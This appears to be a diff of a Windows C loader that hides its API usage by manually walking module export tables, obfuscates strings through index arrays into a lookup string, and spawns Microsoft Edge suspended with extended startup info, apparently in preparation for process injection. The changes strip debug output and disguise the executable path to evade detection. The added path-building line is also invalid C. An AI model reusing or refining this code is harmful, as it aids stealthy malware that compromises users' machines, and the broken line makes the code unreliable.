@@ -113,7 +113,7 @@ cool Getaddress(const char *vv, const char *moduleName) {
 
         if (!module->BaseDllName.Buffer) continue;
         
-        //wprintf(L"Loaded Module: %s\n", module->BaseDllName.Buffer);
+       
         
         if (_wcsicmp(module->BaseDllName.Buffer, wModuleName) == 0) {  // Compare with variable
             BYTE* baseAddress = (BYTE*)module->DllBase;
@@ -135,7 +135,7 @@ cool Getaddress(const char *vv, const char *moduleName) {
                 if (strcmp(functionName, vv) == 0) {
                     DWORD funcRVA = funcArray[ordinalArray[i]];
                     void* funadd = (void*)(baseAddress + funcRVA);
-                    printf("%s found at address: %p\n", vv, funadd);
+                    //printf("%s found at address: %p\n", vv, funadd);
                     return (cool)funadd;
                 }
             }
@@ -217,8 +217,9 @@ int main(int argc, char* argv[]) {
     //char* notpa[] = {28, 64, 63, 48, 8, 13, 3, 14, 22, 18, 63, 44, 24, 18, 19, 4, 12, 55, 54, 63, 13, 14, 19, 4, 15, 0, 3, 62, 4, 23, 4};
     
     //CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR) "/c start cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi);
-
-    CreateProcessA((LPSTR)"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi);
+    int edg[]={12, 18, 4, 3, 6, 4, 62, 4, 23, 4};
+    char edgePath[] = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\"+getoriginal(edg, big_string, sizeof(edg));
+    CreateProcessA((LPSTR)edgePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi);
     
     
     HANDLE hProcess = pi.hProcess;
